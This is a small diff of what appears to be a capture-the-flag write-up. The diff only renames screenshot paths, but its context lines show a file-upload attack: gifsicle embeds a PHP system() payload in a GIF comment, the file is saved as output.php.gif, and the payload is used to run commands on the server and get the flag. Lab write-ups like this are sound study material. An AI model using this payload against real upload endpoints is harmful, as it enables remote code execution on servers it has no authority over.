@@ -67,7 +67,7 @@ gifsicle < frame-1.gif --comment "<?php system('id'); ?>" > output.php.gif
 
 Go to that path and get some interesting things:
 
-![](<../.gitbook/assets/image (1) (2).png>)
+![](<../.gitbook/assets/image (1) (2) (2).png>)
 
 * It works, try other commands to rce :
 
@@ -75,7 +75,7 @@ Go to that path and get some interesting things:
 gifsicle < frame-1.gif --comment "<?php system('ls /'); ?>" > output.php.gif
 ```
 
-![Here yah gooooo](<../.gitbook/assets/image (4).png>)
+![Here yah gooooo](<../.gitbook/assets/image (4) (3).png>)
 
 * Now just use rce command and got the flag:
 
